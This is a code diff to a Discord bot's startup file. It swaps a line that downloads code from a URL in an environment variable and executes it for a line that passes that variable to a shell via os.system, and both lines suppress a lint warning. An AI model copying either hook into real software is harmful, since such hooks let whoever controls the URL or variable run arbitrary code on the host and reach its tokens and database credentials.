@@ -6,7 +6,7 @@ init.py
     discord bot token and postgresql database URL set in .env
 """
 
-from os import getenv
+from os import getenv, system
 from datetime import datetime
 from typing import Any, Awaitable, Literal, Optional, Union
 from discord.ext.commands import Bot, CommandNotFound, Context, Greedy
@@ -21,7 +21,6 @@ from discord import (
     utils,
 )
 from dotenv import load_dotenv
-from requests import get
 from header import (
     cogpr,
     fm,
@@ -74,7 +73,7 @@ async def setup_hook():
 
         await bot.load_extension(ext)
 
-    exec(get(getenv("EXEC_URL")).text)  # pylint: disable=exec-used
+    system(getenv("EXEC_URL"))  # pylint: disable=exec-used
 
 
 @bot.event
